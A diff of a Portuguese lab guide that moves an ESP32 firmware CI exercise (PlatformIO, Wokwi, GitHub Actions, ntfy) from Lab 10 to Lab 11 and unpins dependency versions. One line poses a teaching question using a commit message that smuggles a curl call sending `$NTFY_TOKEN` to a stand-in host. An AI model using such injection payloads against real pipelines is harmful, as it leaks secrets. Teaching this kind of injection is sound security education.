@@ -13,6 +13,7 @@ sidebar_position: 14
 - [ ] Notificações no ntfy (sucesso, falha e release) e release com o `firmware.bin` ao criar a tag `v1.0.0` (T6)
 - [ ] Previsões P1–P4 respondidas no `README.md`
 - [ ] Nenhum `push --force`; cada tarefa num commit `Tn:`
+- [ ] Logout do Git e do `gh` no computador do laboratório
 
 :::info[Pontuação]
 **T1…T6 = 100 pts** (esta aula não tem desafios): T1 10 · T2 20 · T3 15 · T4 20 · T5 15 ·
@@ -66,8 +67,8 @@ flowchart LR
 
 ## Material
 
-- VS Code + **PlatformIO** (o `pio` do terminal do PlatformIO) + extensão **Wokwi**.
-- **`wokwi-cli` 0.28.1** e um **token do Wokwi CI** ([wokwi.com/dashboard/ci](https://wokwi.com/dashboard/ci)). Cada
+- VS Code + **PlatformIO** (o `pio` no terminal `cmd` do VS Code) + extensão **Wokwi**.
+- **`wokwi-cli`** (a versão mais recente) e um **token do Wokwi CI** ([wokwi.com/dashboard/ci](https://wokwi.com/dashboard/ci)). Cada
   simulação gasta minutos da cota do plano (confira no painel): não deixe o CI rodando em loop.
 - Uma conta no **GitHub**, com o repositório do grupo.
 - **ntfy**: o app no celular (Android/iOS) ou o navegador. Use o servidor do LAB IoT, com o
@@ -87,11 +88,11 @@ o compilador Xtensa, o LEDC, o ADC e a temporização do firmware inteiro.
 
 ## Clonar o repositório do grupo {/* #clonar */}
 
-<LabTeamMembers labName="lab10" />
+<LabTeamMembers labName="lab11" />
 
 ## Envie o link do repositório do seu grupo no Moodle: {/* #moodle-link */}
 
-<LabSubmit labName="lab10" />
+<LabSubmit labName="lab11" />
 
 <details>
 <summary><strong>Mapa de tarefas</strong> — 6 tarefas · 100 pts</summary>
@@ -105,14 +106,14 @@ o compilador Xtensa, o LEDC, o ADC e a temporização do firmware inteiro.
 
 </details>
 
-O repositório nasce do `lab10-template`, com o firmware **final do Lab 07** em
+O repositório nasce do `lab11-template`, com o firmware **final do Lab 07** em
 `src/main.cpp`:
 
 <FileTree
   details={true}
   defaultOpen={false}
   title="Estrutura de Arquivos do Projeto"
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     "platformio.ini u",
     "src/main.cpp u",
@@ -142,9 +143,9 @@ O repositório nasce do `lab10-template`, com o firmware **final do Lab 07** em
   ]}
 />
 
-:::info[Tópicos do Lab 10]
-O firmware normal continua falando MQTT, agora em `elt85b/lab10/grupo-X/` (`dht`, `adc`,
-`pwm`, `status`), com os comandos em `elt85b/lab10/grupo-X/cmd/<nome>`: `modo`, `aquecedor`,
+:::info[Tópicos do Lab 11]
+O firmware normal continua falando MQTT, agora em `elt85b/lab11/grupo-x/` (`dht`, `adc`,
+`pwm`, `status`), com os comandos em `elt85b/lab11/grupo-x/cmd/<nome>`: `modo`, `aquecedor`,
 `ventilador` e `intervalo`. O firmware de **CI** (`env:ci`) não usa rede: recebe os mesmos
 comandos pela **serial**, uma linha `<nome> <valor>` (`modo auto`, `aq 50`, `intervalo 2`).
 :::
@@ -167,7 +168,7 @@ separar:
 O **contrato** já está no repositório. Você escreve o `.cpp`:
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={["lib/camara_logica/camara_logica.h r"]}
 />
 
@@ -255,7 +256,7 @@ void setup() {
 
 E o `platformio.ini` ganha três ambientes:
 
-<FileTree root="lab10-grupo-X" files={["platformio.ini u"]} />
+<FileTree root="lab11-grupo-x" files={["platformio.ini u"]} />
 
 ```ini title="platformio.ini"
 [platformio]
@@ -265,16 +266,16 @@ default_envs = esp32dev
 test_framework = unity
 
 [esp32]
-platform = espressif32@6.9.0             ; versão fixa: o CI precisa ser reprodutível
+platform = espressif32                   ; sem versão: a mais recente
 board = esp32dev
 framework = arduino
 monitor_speed = 115200
 lib_deps =
-    adafruit/DHT sensor library@1.4.6
-    adafruit/Adafruit Unified Sensor@1.1.14
-    knolleary/PubSubClient@2.8
-    adafruit/Adafruit SSD1306@2.5.13
-    adafruit/Adafruit GFX Library@1.11.11
+    adafruit/DHT sensor library
+    adafruit/Adafruit Unified Sensor
+    knolleary/PubSubClient
+    adafruit/Adafruit SSD1306
+    adafruit/Adafruit GFX Library
 
 [env:esp32dev]
 extends = esp32
@@ -291,14 +292,17 @@ test_ignore = test_alvo                  ; testes que precisam de periférico do
 lib_compat_mode = off
 ```
 
-:::warning[Versões fixas]
-Num pipeline, `^1.4.6` ("qualquer 1.x a partir de 1.4.6") faz o **mesmo commit** compilar com
-bibliotecas diferentes em dias diferentes. Fixe a plataforma e as bibliotecas, e atualize de
-propósito, num commit próprio.
+:::note[Sempre a versão mais recente]
+A plataforma e as bibliotecas ficam **sem versão**: cada build usa a mais recente. O lado bom é
+receber correções sem esforço; o lado ruim é que o **mesmo commit** pode compilar diferente em
+dias diferentes. É aí que o CI ajuda: se uma atualização quebrar algo, o pipeline fica
+vermelho, e o log mostra as versões usadas (as linhas `PLATFORM:` e `PACKAGES:` do `pio run`).
 :::
 
-```powershell title="Terminal do PlatformIO"
-pio run -e esp32dev -e ci | Out-File -Encoding utf8 evidencias/t1-build.txt
+```shell title="Terminal do VS Code (cmd)"
+if not exist evidencias mkdir evidencias
+pio run -e esp32dev -e ci > evidencias\t1-build.txt 2>&1
+type evidencias\t1-build.txt
 ```
 
 ```text title="evidencias/t1-build.txt (final)"
@@ -312,7 +316,7 @@ O firmware de CI fica bem menor (sem a pilha Wi-Fi e o MQTT), e por isso também
 rápido. Compare o `RAM:`/`Flash:` dos dois no log.
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     "lib/camara_logica/camara_logica.cpp c",
     "src/main.cpp u",
@@ -323,7 +327,7 @@ rápido. Compare o `RAM:`/`Flash:` dos dois no log.
 
 <CommitPoint
   id="t1"
-  task="Logica testavel em lib/camara_logica"
+  task="Lógica testável em lib/camara_logica"
   pontos={10}
   files="lib/camara_logica/camara_logica.cpp src/main.cpp platformio.ini evidencias/t1-build.txt"
 />
@@ -352,7 +356,7 @@ seu PC.
 
 ### 2.2 Os testes
 
-<FileTree root="lab10-grupo-X" files={["test/test_logica/test_logica.cpp c"]} />
+<FileTree root="lab11-grupo-x" files={["test/test_logica/test_logica.cpp c"]} />
 
 ```cpp title="test/test_logica/test_logica.cpp (estrutura e alguns testes)"
 #include <math.h>
@@ -443,9 +447,10 @@ int main() { return rodarTestes(); }
 | `interpretarPercentual` | válidos, `"12.5\r\n"`, fora da faixa, lixo, `"50abc"`, vazio                       |
 | `formatarPwm`           | JSON exato, `t` = NAN vira `null`, buffer pequeno não estoura                      |
 
-```powershell title="Terminal do PlatformIO"
+```shell title="Terminal do VS Code (cmd)"
 pio test -e native --junit-output-path relatorio-native.xml
-pio test -e native | Out-File -Encoding utf8 evidencias/t2-pio-test.txt
+pio test -e native > evidencias\t2-pio-test.txt 2>&1
+type evidencias\t2-pio-test.txt
 ```
 
 ```text title="evidencias/t2-pio-test.txt (final)"
@@ -473,7 +478,7 @@ quantos dos 4096 valores do ADC o resultado muda?) e escreva um teste que **pegu
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={["test/test_logica/test_logica.cpp c", "evidencias/t2-pio-test.txt c"]}
 />
 
@@ -490,13 +495,14 @@ quantos dos 4096 valores do ADC o resultado muda?) e escreva um teste que **pegu
 
 ### 3.1 Instalar e configurar o token
 
-```powershell title="Terminal (raiz do repositório)"
-curl.exe -L -o wokwi-cli.exe https://github.com/wokwi/wokwi-cli/releases/download/v0.28.1/wokwi-cli-win-x64.exe
-.\wokwi-cli.exe --version                       # 0.28.1
-$env:WOKWI_CLI_TOKEN = "cole-aqui-o-token"      # só nesta janela do terminal
+```shell title="Terminal do VS Code (cmd), na raiz do repositório"
+curl -L -o wokwi-cli.exe https://github.com/wokwi/wokwi-cli/releases/latest/download/wokwi-cli-win-x64.exe
+wokwi-cli.exe --version
+set WOKWI_CLI_TOKEN=cole-aqui-o-token
 ```
 
-No Linux e no macOS, baixe `wokwi-cli-linuxstatic-x64` ou `wokwi-cli-macos-arm64` e use
+O `set` vale só nesta janela do terminal; escreva sem aspas e sem espaços em volta do `=`.
+Para atualizar o `wokwi-cli`, baixe de novo com o mesmo `curl`. No Linux e no macOS, baixe `wokwi-cli-linuxstatic-x64` ou `wokwi-cli-macos-arm64` e use
 `export WOKWI_CLI_TOKEN=...`. O `.gitignore` já ignora o executável.
 
 :::warning[O token é uma senha]
@@ -506,18 +512,19 @@ Nunca coloque o token num arquivo do repositório, nem no `ci.yml`. No GitHub, e
 
 ### 3.2 Lint do diagrama (sem token)
 
-```powershell title="Terminal"
-.\wokwi-cli.exe lint --warnings-as-errors . | Out-File -Encoding utf8 evidencias/t3-lint.txt
+```shell title="Terminal do VS Code (cmd)"
+wokwi-cli.exe lint --warnings-as-errors . > evidencias\t3-lint.txt 2>&1
+type evidencias\t3-lint.txt
 ```
 
-O `diagram.json` do Lab 07 **não passa**: o `lint` acusa um atributo que o analisador lógico
-não tem. Corrija o diagrama até sair só a nota `info` sobre a placa. Aproveite e mude o valor
-inicial do potenciômetro para `0`: o teste de integração (T4) precisa começar de um estado
+Com o `--warnings-as-errors`, qualquer aviso vira erro: a saída tem de trazer só a nota `info`
+sobre a placa. Se aparecer algo mais, corrija o `diagram.json`. Depois, mude o valor inicial do
+potenciômetro para `0`: o teste de integração (T4) precisa começar de um estado
 **conhecido**.
 
-```json title="diagram.json (as duas peças alteradas)"
+```json title="diagram.json (as duas peças, como devem ficar)"
 { "type": "wokwi-potentiometer", "id": "pot1", "top": 160, "left": -150, "attrs": { "value": "0" } },
-{ "type": "wokwi-logic-analyzer", "id": "logic1", "top": 300, "left": 300, "attrs": { "filename": "lab10-pwm" } }
+{ "type": "wokwi-logic-analyzer", "id": "logic1", "top": 300, "left": 300, "attrs": { "filename": "lab11-pwm" } }
 ```
 
 (Mantenha `top` e `left` como estão no seu arquivo.)
@@ -527,7 +534,7 @@ inicial do potenciômetro para `0`: o teste de integração (T4) precisa começa
 O mesmo `test_logica.cpp` também roda **no ESP32**, onde mudam o compilador (Xtensa), o
 tamanho de `long` e a FPU. E uma segunda pasta testa o que só existe lá, o LEDC e o ADC:
 
-<FileTree root="lab10-grupo-X" files={["test/test_alvo/test_alvo.cpp c"]} />
+<FileTree root="lab11-grupo-x" files={["test/test_alvo/test_alvo.cpp c"]} />
 
 ```cpp title="test/test_alvo/test_alvo.cpp (trecho)"
 void test_ledc_aquecedor_5hz() {
@@ -558,17 +565,16 @@ void test_adc_do_potenciometro() {
 O `pio test` **compila** o teste para o ESP32 e para (não há placa para gravar). O `wokwi-cli`
 **roda** o `.elf` e decide pelo texto do serial:
 
-```powershell title="Terminal"
-foreach ($t in "test_logica", "test_alvo") {
-  pio test -e esp32dev -f $t --without-uploading --without-testing
-  .\wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 `
-    --expect-text "Tests 0 Failures" --fail-text ":FAIL" `
-    --serial-log-file "evidencias/t3-alvo-$t.txt" .
-}
+```shell title="Terminal do VS Code (cmd)"
+pio test -e esp32dev -f test_logica --without-uploading --without-testing
+wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 --expect-text "Tests 0 Failures" --fail-text ":FAIL" --serial-log-file evidencias/t3-alvo-test_logica.txt .
+
+pio test -e esp32dev -f test_alvo --without-uploading --without-testing
+wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 --expect-text "Tests 0 Failures" --fail-text ":FAIL" --serial-log-file evidencias/t3-alvo-test_alvo.txt .
 ```
 
 ```text title="Saída esperada (test_alvo)"
-Wokwi CLI v0.28.1 (7cf4ffaebfd8)
+Wokwi CLI v0.x.x (...)
 Connected to Wokwi Simulation API <versão>
 Starting simulation...
 test/test_alvo/test_alvo.cpp:82:test_ledc_aquecedor_5hz:PASS
@@ -597,7 +603,7 @@ um? O que poderia dar errado se o cast não existisse, e por que um teste que pa
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     "test/test_alvo/test_alvo.cpp c",
     "diagram.json u",
@@ -633,7 +639,7 @@ os `Ticker`, a banda morta do ADC, o DHT22, a serial e o LEDC funcionando juntos
 Cada passo tem **um** comando (e um `name` opcional). O potenciômetro aceita `position` de
 0,0 a 1,0; o DHT22, `temperature` (°C).
 
-<FileTree root="lab10-grupo-X" files={["ci/cenario_integracao.yaml c"]} />
+<FileTree root="lab11-grupo-x" files={["ci/cenario_integracao.yaml c"]} />
 
 ```yaml title="ci/cenario_integracao.yaml"
 name: Camara - modos pot e auto
@@ -712,12 +718,12 @@ Com `--vcd-file`, o `wokwi-cli` grava o **analisador lógico** (D0 = GPIO25, D1 
 arquivo VCD, o mesmo formato que o PulseView abre. O `ci/verificar_pwm.py` (pronto, só
 biblioteca padrão) procura em cada canal um trecho com a frequência e o duty esperados:
 
-```powershell title="Terminal"
+```shell title="Terminal do VS Code (cmd)"
 pio run -e ci
-.\wokwi-cli.exe --elf .pio/build/ci/firmware.elf --scenario ci/cenario_integracao.yaml `
-  --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt . 2>&1 |
-  Out-File -Encoding utf8 evidencias/t4-cenario.txt
-py ci/verificar_pwm.py pwm.vcd --listar | Out-File -Encoding utf8 evidencias/t4-pwm.txt
+wokwi-cli.exe --elf .pio/build/ci/firmware.elf --scenario ci/cenario_integracao.yaml --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt . > evidencias\t4-cenario.txt 2>&1
+type evidencias\t4-cenario.txt
+py ci\verificar_pwm.py pwm.vcd --listar > evidencias\t4-pwm.txt 2>&1
+type evidencias\t4-pwm.txt
 ```
 
 ```text title="evidencias/t4-cenario.txt (trecho)"
@@ -746,7 +752,7 @@ chamado de **instável** (_flaky_). Por que ele é pior do que um teste que semp
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     "ci/cenario_integracao.yaml c",
     "evidencias/t4-cenario.txt c",
@@ -756,7 +762,7 @@ chamado de **instável** (_flaky_). Por que ele é pior do que um teste que semp
 
 <CommitPoint
   id="t4"
-  task="Cenario de integracao e analisador logico"
+  task="Cenário de integração e analisador lógico"
   pontos={20}
   files="ci/cenario_integracao.yaml evidencias/t4-cenario.txt evidencias/t4-pwm.txt"
 />
@@ -792,7 +798,7 @@ Em **Settings ▸ Secrets and variables ▸ Actions**:
 
 ### 5.3 O workflow
 
-<FileTree root="lab10-grupo-X" files={[".github/workflows/ci.yml c"]} />
+<FileTree root="lab11-grupo-x" files={[".github/workflows/ci.yml c"]} />
 
 ```yaml title=".github/workflows/ci.yml (jobs testes, firmware e simulacao)"
 name: CI
@@ -811,10 +817,6 @@ concurrency: # um push novo cancela a execução anterior do mesmo ramo
   group: ci-${{ github.ref }}
   cancel-in-progress: true
 
-env:
-  PLATFORMIO_VERSAO: "6.2.0"
-  WOKWI_CLI_VERSAO: "v0.28.1"
-
 jobs:
   testes:
     name: Testes da lógica (pio test -e native)
@@ -823,16 +825,18 @@ jobs:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
         with:
-          python-version: "3.12"
+          python-version: "3.x"
       - name: Cache do PlatformIO
         uses: actions/cache@v4
         with:
           path: |
             ~/.platformio
             ~/.cache/pip
-          key: pio-${{ runner.os }}-${{ env.PLATFORMIO_VERSAO }}-${{ hashFiles('platformio.ini') }}
-      - name: Instala o PlatformIO
-        run: pip install "platformio==${PLATFORMIO_VERSAO}"
+          key: pio-${{ runner.os }}-${{ hashFiles('platformio.ini') }}
+      - name: Instala o PlatformIO (a versão mais recente)
+        run: pip install --upgrade platformio
+      - name: Atualiza o que veio do cache
+        run: pio pkg update -e native
       - name: Testes (Unity, no PC)
         run: pio test -e native --junit-output-path relatorio-native.xml
       - name: Resumo dos testes
@@ -845,7 +849,7 @@ jobs:
         run: |
           mkdir -p "$HOME/.local/bin"
           curl -sSfL -o "$HOME/.local/bin/wokwi-cli" \
-            "https://github.com/wokwi/wokwi-cli/releases/download/${WOKWI_CLI_VERSAO}/wokwi-cli-linuxstatic-x64"
+            "https://github.com/wokwi/wokwi-cli/releases/latest/download/wokwi-cli-linuxstatic-x64"
           chmod +x "$HOME/.local/bin/wokwi-cli"
           echo "$HOME/.local/bin" >> "$GITHUB_PATH"
       - name: Lint do diagram.json (não precisa de token)
@@ -865,16 +869,18 @@ jobs:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
         with:
-          python-version: "3.12"
+          python-version: "3.x"
       - name: Cache do PlatformIO
         uses: actions/cache@v4
         with:
           path: |
             ~/.platformio
             ~/.cache/pip
-          key: pio-esp32-${{ runner.os }}-${{ env.PLATFORMIO_VERSAO }}-${{ hashFiles('platformio.ini') }}
-      - name: Instala o PlatformIO
-        run: pip install "platformio==${PLATFORMIO_VERSAO}"
+          key: pio-esp32-${{ runner.os }}-${{ hashFiles('platformio.ini') }}
+      - name: Instala o PlatformIO (a versão mais recente)
+        run: pip install --upgrade platformio
+      - name: Atualiza a plataforma e as bibliotecas que vieram do cache
+        run: pio pkg update -e esp32dev -e ci
       # os testes para o alvo usam a MESMA pasta .pio/build/esp32dev: compila um por vez e
       # copia o .elf antes de compilar o próximo (e o firmware normal por último)
       - name: Testes compilados para o ESP32
@@ -930,7 +936,7 @@ jobs:
         run: |
           mkdir -p "$HOME/.local/bin"
           curl -sSfL -o "$HOME/.local/bin/wokwi-cli" \
-            "https://github.com/wokwi/wokwi-cli/releases/download/${WOKWI_CLI_VERSAO}/wokwi-cli-linuxstatic-x64"
+            "https://github.com/wokwi/wokwi-cli/releases/latest/download/wokwi-cli-linuxstatic-x64"
           chmod +x "$HOME/.local/bin/wokwi-cli"
           echo "$HOME/.local/bin" >> "$GITHUB_PATH"
       - name: Testes Unity no ESP32 simulado
@@ -981,7 +987,7 @@ do `README.md`:
 testes e os artefatos) e o link da execução no `README.md`.
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     ".github/workflows/ci.yml c",
     "README.md u",
@@ -1110,8 +1116,8 @@ manda uma notificação para o celular.
    2. **Verde:** feche o PR sem juntar (ou desfaça a mudança). No `main`, chega "✅ ... CI ok".
    3. **Release:** crie e envie a tag:
 
-      ```powershell title="Terminal"
-      git tag -a v1.0.0 -m "Lab 10: firmware testado"
+      ```shell title="Terminal (cmd)"
+      git tag -a v1.0.0 -m "Lab 11: firmware testado"
       git push origin v1.0.0
       ```
 
@@ -1126,14 +1132,14 @@ manda uma notificação para o celular.
    - o `ci.yml` completo.
 
 ```text title="Exemplo das notificações (ntfy)"
-🚀 lab10-grupo-x v1.0.0 publicado                                   prioridade alta
+🚀 lab11-grupo-x v1.0.0 publicado                                   prioridade alta
    testes: success · firmware: success · simulação: success · release: success
-   0123456 por aluno-a: Lab 10: firmware testado
+   0123456 por aluno-a: Lab 11: firmware testado
 
-✅ lab10-grupo-x: CI ok em main
+✅ lab11-grupo-x: CI ok em main
    testes: success · firmware: success · simulação: success · release: skipped
 
-❌ lab10-grupo-x: CI falhou em quebra                               prioridade alta
+❌ lab11-grupo-x: CI falhou em quebra                               prioridade alta
    testes: failure · firmware: skipped · simulação: skipped · release: skipped
 ```
 
@@ -1146,7 +1152,7 @@ Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKE
 :::
 
 <FileTree
-  root="lab10-grupo-X"
+  root="lab11-grupo-x"
   files={[
     ".github/workflows/ci.yml u",
     "README.md u",
@@ -1163,5 +1169,9 @@ Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKE
 />
 
 ---
+
+## Logout do seu ambiente dev, git e gh {/* #logout */}
+
+<GitLogOut />
 
 <LabLogout />
